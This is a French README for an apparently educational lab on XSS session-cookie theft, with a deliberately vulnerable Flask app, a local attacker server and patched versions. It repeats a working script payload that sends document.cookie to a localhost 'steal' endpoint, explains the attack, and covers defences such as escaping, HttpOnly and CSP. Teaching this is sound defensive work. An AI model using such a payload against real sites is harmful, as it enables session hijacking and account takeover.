# Exemple XSS - Vol de Cookie de Session

⚠️ **À des fins éducatives uniquement!** Ne jamais utiliser ces techniques de manière malveillante.

## Description

Cet exemple démontre une attaque **XSS (Cross-Site Scripting)** permettant le vol de cookies de session (session hijacking).

## Fichiers

- `vulnerable_app.py` - Application Flask vulnérable au XSS
- `attacker_server.py` - Serveur qui collecte les cookies volés

## Comment tester

### 1. Prérequis

- Installer `uv` > <https://docs.astral.sh/uv/getting-started/installation/>

### 2. Lancer les deux serveurs (dans deux terminaux)

Terminal 1 - Application vulnérable:

```bash
uv run vulnerable_server.py
```

Terminal 2 - Serveur attaquant:

```bash
uv run attacker_server.py
```

### 3. Exploiter la vulnérabilité

1. Ouvrez <http://localhost:5000> dans votre navigateur
2. Dans le champ "message", entrez ce payload XSS:

```html
<script>new Image().src="http://localhost:5001/steal?cookie="+document.cookie</script>
```

1. Cliquez sur "Envoyer"
2. Observez le serveur attaquant (terminal 2) - les cookies apparaissent!
3. Ou visitez <http://localhost:5001/dashboard> pour voir le dashboard

## Explication de l'attaque

L'explication se trouve dans le payload :

```html
<script>new Image().src="http://localhost:5001/steal?cookie="+document.cookie</script>
```

On remarque que le faux message que l'attaquant envoie est en fait du javascript qui va etre executé par le navigateur de toute personne qui lira ce message.

Ce javascript va simplement créer une nouvelle image en indiquant comme URL ... une URL controlée par l'attaquant ! Et en rajoutant le cookie volé directement dans l'URL comme ça le serveur de l'attaquant n'a plus qu'à lire la requête reçue pour retrouver le cookie.

Étape par étape cela donne :

1. L'application vulnérable affiche le message de l'utilisateur **sans échappement** ; dans le cas de l'utilisation du moteur de template html Jinja2, il faut utiliser la macro `| escape`
2. L'attaquant injecte du JavaScript malveillant
3. Le script accède à `document.cookie` et l'envoie vers le serveur attaquant
4. L'attaquant peut maintenant utiliser les cookies pour usurper la session

## Comment se protéger

1. **Toujours échapper les données utilisateur** - Ne pas utiliser `| safe` avec des données non fiables
2. **Utiliser le flag HttpOnly** sur les cookies de session:

   ```python
   resp.set_cookie("session_id", value, httponly=True)
   ```

3. **Content Security Policy (CSP)** - Restreindre les scripts autorisés
4. **Utiliser les fonctions d'échappement automatique** de votre framework

## Exemples sécurisés

### patched_server_httponly

Dans `patched_server_httponly.py` le cookie est désormais en httponly.

Terminal 1 - Application patchée httponly:

```bash
uv run patched_server_httponly.py
```

Terminal 2 - Serveur attaquant:

```bash
uv run attacker_server.py
```

1. Ouvrez <http://localhost:5000> dans votre navigateur
2. Videz les cookies
3. Dans le champ "message", entrez le payload XSS:

```html
<script>new Image().src="http://localhost:5001/steal?cookie="+document.cookie</script>
```

1. Ouvrez <http://localhost:5001/dashboard> dans votre navigateur
2. Aucun cookie volé

Cette solution règle le problème en empechant que le cookie puisse être volé, mais n'empeche pas les XSS.

### patched_server_final

Terminal 1 - Application patchée httponly et xss:

```bash
uv run patched_server_final.py
```

Terminal 2 - Serveur attaquant:

```bash
uv run attacker_server.py
```

1. Ouvrez <http://localhost:5000> dans votre navigateur
2. Videz les cookies
3. Dans le champ "message", entrez le payload XSS:

```html
<script>new Image().src="http://localhost:5001/steal?cookie="+document.cookie</script>
```

1. Remarquez que le payload malveillant s'affiche entierement tel du texte. C'est grâce à la macro "espace" qui va empecher que le navigateur n'execute ce code en le rendant inerte.

Note : il existe evidemment des bypass de ces fonctions d'echappement (escaping en anglais). Exemple avec ce POC d'une vuln <https://github.com/Mitchellzhou1/CVE-2024-48910-PoC>

1. Ouvrez <http://localhost:5001/dashboard> dans votre navigateur
2. Aucun cookie volé, car les XSS sont empéchées **ET** les cookies sont en httponly :-)
